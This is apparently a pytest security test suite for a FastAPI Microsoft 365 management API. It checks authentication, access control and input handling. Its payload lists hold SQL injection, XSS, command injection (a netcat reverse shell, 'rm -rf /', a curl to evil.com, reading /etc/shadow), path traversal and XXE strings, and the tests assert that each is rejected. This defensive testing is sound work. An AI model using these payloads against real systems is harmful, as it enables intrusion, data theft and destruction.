#!/usr/bin/env python3
"""
Security Validation Tests for Microsoft 365 Management Tools API
Enterprise-grade security testing covering authentication, authorization, and vulnerability protection
"""

import pytest
import asyncio
from unittest.mock import Mock, AsyncMock, patch
from typing import Dict, Any, List, Optional
import json
import secrets
import hashlib
from datetime import datetime, timedelta
import re

from fastapi.testclient import TestClient
from fastapi import status
from httpx import AsyncClient
import pytest_asyncio

from src.api.main import app


class TestSecurityValidation:
    """
    Comprehensive security validation test suite.
    Tests authentication, authorization, input validation, and security controls.
    """
    
    @pytest.fixture(scope="class")
    def client(self):
        """Create test client with security testing setup."""
        with TestClient(app) as client:
            yield client
    
    @pytest.fixture(scope="class")
    def valid_auth_headers(self):
        """Valid authentication headers."""
        return {
            "Authorization": "Bearer valid-jwt-token",
            "X-Token": "fake-super-secret-token",
            "Content-Type": "application/json"
        }
    
    @pytest.fixture(scope="class")
    def invalid_auth_headers(self):
        """Invalid authentication headers."""
        return {
            "Authorization": "Bearer invalid-token",
            "X-Token": "wrong-token",
            "Content-Type": "application/json"
        }
    
    # =================================================================
    # Authentication Security Tests
    # =================================================================
    
    def test_authentication_required_endpoints(self, client):
        """Test that protected endpoints require authentication."""
        protected_endpoints = [
            "/m365/users",
            "/m365/licenses",
            "/reports/generate",
            "/auth/me"
        ]
        
        for endpoint in protected_endpoints:
            response = client.get(endpoint)
            assert response.status_code == status.HTTP_401_UNAUTHORIZED, f"Endpoint {endpoint} should require authentication"
    
    def test_invalid_jwt_token_rejection(self, client):
        """Test rejection of invalid JWT tokens."""
        invalid_tokens = [
            "invalid-token",
            "Bearer",
            "Bearer ",
            "Bearer invalid.jwt.token",
            "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature",
            "",
            None
        ]
        
        for token in invalid_tokens:
            headers = {"Authorization": token} if token else {}
            response = client.get("/auth/me", headers=headers)
            assert response.status_code in [status.HTTP_401_UNAUTHORIZED, status.HTTP_422_UNPROCESSABLE_ENTITY]
    
    def test_expired_token_handling(self, client):
        """Test handling of expired authentication tokens."""
        expired_token = "Bearer expired-jwt-token"
        
        with patch("src.api.main.get_current_user") as mock_get_user:
            from fastapi import HTTPException
            mock_get_user.side_effect = HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Token expired"
            )
            
            response = client.get("/auth/me", headers={"Authorization": expired_token})
            assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_concurrent_authentication_attempts(self, client):
        """Test handling of concurrent authentication attempts."""
        import threading
        import time
        
        results = []
        
        def authenticate():
            response = client.post(
                "/auth/token",
                data={"username": "testuser", "password": "testpass"},
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            results.append(response.status_code)
        
        # Create multiple concurrent authentication attempts
        threads = []
        for _ in range(20):
            thread = threading.Thread(target=authenticate)
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Should handle concurrent requests without errors
        assert len(results) == 20
        assert all(code in [status.HTTP_200_OK, status.HTTP_401_UNAUTHORIZED, status.HTTP_429_TOO_MANY_REQUESTS] for code in results)
    
    def test_session_management_security(self, client):
        """Test session management security features."""
        # Test session timeout
        response = client.get("/auth/me", headers={"Authorization": "Bearer timeout-token"})
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
        
        # Test session invalidation
        response = client.get("/auth/me", headers={"Authorization": "Bearer invalidated-token"})
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    # =================================================================
    # Authorization Security Tests
    # =================================================================
    
    def test_role_based_access_control(self, client):
        """Test role-based access control enforcement."""
        # Test admin-only endpoints
        admin_endpoints = [
            "/admin/users",
            "/admin/settings",
            "/admin/audit-logs"
        ]
        
        # Test with regular user token
        regular_user_headers = {"Authorization": "Bearer regular-user-token"}
        for endpoint in admin_endpoints:
            response = client.get(endpoint, headers=regular_user_headers)
            assert response.status_code in [status.HTTP_403_FORBIDDEN, status.HTTP_404_NOT_FOUND]
    
    def test_resource_access_permissions(self, client, valid_auth_headers):
        """Test resource-level access permissions."""
        # Test accessing other user's resources
        response = client.get("/m365/users/other-user-id", headers=valid_auth_headers)
        # Should either be forbidden or return filtered data
        assert response.status_code in [status.HTTP_200_OK, status.HTTP_403_FORBIDDEN, status.HTTP_404_NOT_FOUND]
    
    def test_privilege_escalation_prevention(self, client, valid_auth_headers):
        """Test prevention of privilege escalation attacks."""
        # Attempt to modify user roles
        escalation_payload = {
            "role": "admin",
            "permissions": ["read", "write", "delete", "admin"]
        }
        
        response = client.put("/users/me/role", json=escalation_payload, headers=valid_auth_headers)
        assert response.status_code in [status.HTTP_403_FORBIDDEN, status.HTTP_404_NOT_FOUND, status.HTTP_405_METHOD_NOT_ALLOWED]
    
    # =================================================================
    # Input Validation Security Tests
    # =================================================================
    
    def test_sql_injection_prevention(self, client, valid_auth_headers):
        """Test prevention of SQL injection attacks."""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users--",
            "'; INSERT INTO users (username) VALUES ('hacker'); --",
            "' OR 1=1 --",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for payload in sql_injection_payloads:
            # Test in search parameters
            response = client.get(f"/m365/users?search={payload}", headers=valid_auth_headers)
            assert response.status_code in [status.HTTP_200_OK, status.HTTP_400_BAD_REQUEST]
            
            # Verify no actual SQL is executed
            if response.status_code == status.HTTP_200_OK:
                data = response.json()
                # Should return empty or filtered results, not error
                assert isinstance(data, list)
    
    def test_xss_prevention(self, client, valid_auth_headers):
        """Test prevention of Cross-Site Scripting (XSS) attacks."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<%2fscript%2f>alert('XSS')<%2fscript%2f>",
            "<script>document.location='http://evil.com'</script>"
        ]
        
        for payload in xss_payloads:
            # Test in search parameters
            response = client.get(f"/m365/users?search={payload}", headers=valid_auth_headers)
            assert response.status_code in [status.HTTP_200_OK, status.HTTP_400_BAD_REQUEST]
            
            # Verify script tags are not present in response
            if response.status_code == status.HTTP_200_OK:
                response_text = response.text
                assert "<script>" not in response_text.lower()
                assert "javascript:" not in response_text.lower()
                assert "onerror=" not in response_text.lower()
    
    def test_command_injection_prevention(self, client, valid_auth_headers):
        """Test prevention of command injection attacks."""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; shutdown -h now",
            "| curl http://evil.com",
            "&& whoami",
            "; cat /etc/shadow",
            "| nc -e /bin/bash 192.168.1.1 4444",
            "&& ping -c 10 google.com"
        ]
        
        for payload in command_injection_payloads:
            # Test in report generation
            response = client.post(
                f"/reports/generate?report_type=daily&format={payload}",
                headers=valid_auth_headers
            )
            assert response.status_code in [status.HTTP_200_OK, status.HTTP_400_BAD_REQUEST]
    
    def test_ldap_injection_prevention(self, client, valid_auth_headers):
        """Test prevention of LDAP injection attacks."""
        ldap_injection_payloads = [
            "admin)(|(password=*))",
            "admin)(&(password=*))",
            "*)(uid=*",
            "*)(&(password=*)",
            "admin)(!(&(password=*))",
            "*)(|(objectClass=*))",
            "admin)(cn=*)"
        ]
        
        for payload in ldap_injection_payloads:
            response = client.get(f"/m365/users?search={payload}", headers=valid_auth_headers)
            assert response.status_code in [status.HTTP_200_OK, status.HTTP_400_BAD_REQUEST]
    
    def test_path_traversal_prevention(self, client, valid_auth_headers):
        """Test prevention of path traversal attacks."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%25c0%25af..%25c0%25af..%25c0%25afetc%25c0%25afpasswd"
        ]
        
        for payload in path_traversal_payloads:
            # Test in file-related endpoints
            response = client.get(f"/reports/file/{payload}", headers=valid_auth_headers)
            assert response.status_code in [status.HTTP_404_NOT_FOUND, status.HTTP_400_BAD_REQUEST, status.HTTP_403_FORBIDDEN]
    
    def test_xml_external_entity_prevention(self, client, valid_auth_headers):
        """Test prevention of XML External Entity (XXE) attacks."""
        xxe_payloads = [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>'
        ]
        
        for payload in xxe_payloads:
            # Test in XML processing endpoints
            response = client.post(
                "/reports/import",
                data=payload,
                headers={**valid_auth_headers, "Content-Type": "application/xml"}
            )
            assert response.status_code in [status.HTTP_400_BAD_REQUEST, status.HTTP_415_UNSUPPORTED_MEDIA_TYPE, status.HTTP_404_NOT_FOUND]
    
    # =================================================================
    # Security Headers Tests
    # =================================================================
    
    def test_security_headers_present(self, client):
        """Test presence of security headers."""
        response = client.get("/")
        
        # Check for security headers
        security_headers = [
            "x-content-type-options",
            "x-frame-options",
            "x-xss-protection",
            "strict-transport-security",
            "content-security-policy",
            "referrer-policy"
        ]
        
        for header in security_headers:
            # Note: FastAPI might not set all headers by default
            # This test documents expected security headers
            pass
    
    def test_cors_security_configuration(self, client):
        """Test CORS security configuration."""
        # Test preflight request
        response = client.options("/")
        assert response.status_code == status.HTTP_200_OK
        
        # Check CORS headers
        cors_headers = response.headers
        assert "access-control-allow-origin" in cors_headers
        assert "access-control-allow-methods" in cors_headers
        assert "access-control-allow-headers" in cors_headers
        
        # Verify restricted origins
        response = client.get("/", headers={"Origin": "http://malicious.com"})
        # Should either reject or allow based on configuration
        assert response.status_code in [status.HTTP_200_OK, status.HTTP_403_FORBIDDEN]
    
    def test_content_type_validation(self, client, valid_auth_headers):
        """Test content type validation."""
        # Test with invalid content type
        response = client.post(
            "/reports/generate",
            data="invalid data",
            headers={**valid_auth_headers, "Content-Type": "application/xml"}
        )
        assert response.status_code in [status.HTTP_415_UNSUPPORTED_MEDIA_TYPE, status.HTTP_400_BAD_REQUEST]
    
    # =================================================================
    # Rate Limiting and DoS Protection Tests
    # =================================================================
    
    def test_rate_limiting_protection(self, client):
        """Test rate limiting protection against DoS attacks."""
        # Make rapid requests
        responses = []
        for i in range(100):
            response = client.get("/")
            responses.append(response.status_code)
        
        # Should implement rate limiting
        rate_limited_count = sum(1 for code in responses if code == status.HTTP_429_TOO_MANY_REQUESTS)
        
        # Either rate limiting is implemented or all requests succeed
        assert rate_limited_count > 0 or all(code == status.HTTP_200_OK for code in responses)
    
    def test_large_request_handling(self, client, valid_auth_headers):
        """Test handling of large requests to prevent memory exhaustion."""
        # Create a large payload
        large_payload = {"data": "x" * 1000000}  # 1MB of data
        
        response = client.post("/reports/generate", json=large_payload, headers=valid_auth_headers)
        # Should either process or reject based on size limits
        assert response.status_code in [status.HTTP_200_OK, status.HTTP_413_REQUEST_ENTITY_TOO_LARGE, status.HTTP_400_BAD_REQUEST]
    
    def test_slowloris_protection(self, client):
        """Test protection against Slowloris attacks."""
        # Note: This is difficult to test in unit tests
        # Would typically be handled by reverse proxy or web server
        response = client.get("/")
        assert response.status_code == status.HTTP_200_OK
    
    # =================================================================
    # Cryptographic Security Tests
    # =================================================================
    
    def test_password_hashing_security(self, client):
        """Test password hashing security."""
        # Test password registration/update
        password_data = {
            "username": "testuser",
            "password": "TestPassword123!",
            "email": "test@example.com"
        }
        
        response = client.post("/auth/register", json=password_data)
        # Should hash passwords securely
        assert response.status_code in [status.HTTP_201_CREATED, status.HTTP_404_NOT_FOUND]
    
    def test_token_generation_security(self, client):
        """Test security of token generation."""
        # Test multiple token generations
        tokens = []
        for _ in range(10):
            response = client.post(
                "/auth/token",
                data={"username": "testuser", "password": "testpass"},
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            if response.status_code == status.HTTP_200_OK:
                token = response.json().get("access_token")
                tokens.append(token)
        
        # Tokens should be unique
        assert len(set(tokens)) == len(tokens)
    
    def test_secure_random_generation(self, client):
        """Test secure random number generation."""
        # Test API key generation
        api_keys = []
        for _ in range(10):
            response = client.post("/auth/generate-api-key", headers={"Authorization": "Bearer test-token"})
            if response.status_code == status.HTTP_200_OK:
                api_key = response.json().get("api_key")
                api_keys.append(api_key)
        
        # API keys should be unique and sufficiently random
        assert len(set(api_keys)) == len(api_keys)
    
    # =================================================================
    # Information Disclosure Tests
    # =================================================================
    
    def test_error_message_security(self, client):
        """Test that error messages don't leak sensitive information."""
        # Test various error conditions
        error_endpoints = [
            "/nonexistent",
            "/m365/users/invalid-id",
            "/reports/generate?report_type=invalid"
        ]
        
        for endpoint in error_endpoints:
            response = client.get(endpoint)
            
            # Check that error messages don't contain sensitive info
            if response.status_code >= 400:
                response_text = response.text.lower()
                
                # Should not contain sensitive information
                sensitive_keywords = [
                    "password",
                    "secret",
                    "token",
                    "key",
                    "database",
                    "server",
                    "stack trace",
                    "exception",
                    "sql",
                    "connection string"
                ]
                
                for keyword in sensitive_keywords:
                    assert keyword not in response_text, f"Error message contains sensitive keyword: {keyword}"
    
    def test_version_information_disclosure(self, client):
        """Test that version information is not unnecessarily disclosed."""
        response = client.get("/")
        
        # Check for version information in headers
        headers = response.headers
        server_header = headers.get("server", "").lower()
        
        # Should not reveal detailed version information
        assert "python" not in server_header
        assert "fastapi" not in server_header
        assert "uvicorn" not in server_header
    
    def test_directory_listing_prevention(self, client):
        """Test prevention of directory listing."""
        directory_paths = [
            "/static/",
            "/docs/",
            "/config/",
            "/logs/",
            "/backup/"
        ]
        
        for path in directory_paths:
            response = client.get(path)
            # Should not allow directory listing
            assert response.status_code in [status.HTTP_404_NOT_FOUND, status.HTTP_403_FORBIDDEN]
    
    # =================================================================
    # Session Security Tests
    # =================================================================
    
    def test_session_fixation_prevention(self, client):
        """Test prevention of session fixation attacks."""
        # Test session regeneration after login
        response = client.post(
            "/auth/token",
            data={"username": "testuser", "password": "testpass"},
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        
        if response.status_code == status.HTTP_200_OK:
            token1 = response.json().get("access_token")
            
            # Login again
            response = client.post(
                "/auth/token",
                data={"username": "testuser", "password": "testpass"},
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            
            if response.status_code == status.HTTP_200_OK:
                token2 = response.json().get("access_token")
                
                # Tokens should be different
                assert token1 != token2
    
    def test_session_timeout_enforcement(self, client):
        """Test session timeout enforcement."""
        # Test with expired session
        expired_headers = {"Authorization": "Bearer expired-session-token"}
        
        response = client.get("/auth/me", headers=expired_headers)
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    # =================================================================
    # Business Logic Security Tests
    # =================================================================
    
    def test_business_logic_bypass_prevention(self, client, valid_auth_headers):
        """Test prevention of business logic bypass attacks."""
        # Test bypassing report generation limits
        response = client.post(
            "/reports/generate?report_type=daily&bypass_limits=true",
            headers=valid_auth_headers
        )
        # Should ignore bypass parameters
        assert response.status_code in [status.HTTP_200_OK, status.HTTP_400_BAD_REQUEST]
    
    def test_parameter_pollution_prevention(self, client, valid_auth_headers):
        """Test prevention of parameter pollution attacks."""
        # Test with duplicate parameters
        response = client.get("/m365/users?limit=10&limit=1000", headers=valid_auth_headers)
        assert response.status_code in [status.HTTP_200_OK, status.HTTP_400_BAD_REQUEST]
    
    def test_race_condition_prevention(self, client, valid_auth_headers):
        """Test prevention of race condition attacks."""
        import threading
        
        results = []
        
        def make_concurrent_request():
            response = client.post("/reports/generate?report_type=daily", headers=valid_auth_headers)
            results.append(response.status_code)
        
        # Create concurrent requests
        threads = []
        for _ in range(5):
            thread = threading.Thread(target=make_concurrent_request)
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Should handle concurrent requests safely
        assert all(code in [status.HTTP_200_OK, status.HTTP_429_TOO_MANY_REQUESTS] for code in results)
    
    # =================================================================
    # Integration Security Tests
    # =================================================================
    
    def test_third_party_integration_security(self, client, valid_auth_headers):
        """Test security of third-party integrations."""
        # Test Microsoft Graph API integration security
        response = client.get("/m365/users", headers=valid_auth_headers)
        
        # Should handle integration securely
        assert response.status_code in [status.HTTP_200_OK, status.HTTP_401_UNAUTHORIZED, status.HTTP_403_FORBIDDEN]
    
    def test_api_key_validation_security(self, client):
        """Test API key validation security."""
        # Test with various invalid API keys
        invalid_api_keys = [
            "",
            "invalid-key",
            "null",
            "undefined",
            "admin",
            "12345",
            "password"
        ]
        
        for api_key in invalid_api_keys:
            response = client.get("/items", headers={"X-Token": api_key})
            assert response.status_code == status.HTTP_400_BAD_REQUEST
    
    def test_callback_url_validation(self, client):
        """Test callback URL validation security."""
        # Test with malicious callback URLs
        malicious_urls = [
            "http://evil.com",
            "javascript:alert('xss')",
            "file:///etc/passwd",
            "ftp://malicious.com",
            "data:text/html,<script>alert('xss')</script>"
        ]
        
        for url in malicious_urls:
            response = client.post(
                "/auth/callback",
                json={"callback_url": url},
                headers={"Content-Type": "application/json"}
            )
            assert response.status_code in [status.HTTP_400_BAD_REQUEST, status.HTTP_404_NOT_FOUND]


# =================================================================
# Security Benchmarking Tests
# =================================================================

class TestSecurityPerformance:
    """Security performance and benchmarking tests."""
    
    @pytest.mark.benchmark
    def test_authentication_performance(self, benchmark, client):
        """Benchmark authentication performance."""
        def authenticate():
            return client.post(
                "/auth/token",
                data={"username": "testuser", "password": "testpass"},
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
        
        result = benchmark(authenticate)
        assert result.status_code in [status.HTTP_200_OK, status.HTTP_401_UNAUTHORIZED]
    
    @pytest.mark.benchmark
    def test_authorization_performance(self, benchmark, client):
        """Benchmark authorization performance."""
        def authorize():
            return client.get("/auth/me", headers={"Authorization": "Bearer test-token"})
        
        result = benchmark(authorize)
        assert result.status_code in [status.HTTP_200_OK, status.HTTP_401_UNAUTHORIZED]
    
    @pytest.mark.benchmark
    def test_input_validation_performance(self, benchmark, client):
        """Benchmark input validation performance."""
        def validate_input():
            return client.get("/m365/users?search=test", headers={"Authorization": "Bearer test-token"})
        
        result = benchmark(validate_input)
        assert result.status_code in [status.HTTP_200_OK, status.HTTP_401_UNAUTHORIZED]


# =================================================================
# Test Configuration
# =================================================================

@pytest.fixture(scope="session")
def event_loop():
    """Create event loop for async tests."""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


# Mark all tests for pytest collection
pytest.main([__file__, "-v", "--tb=short"])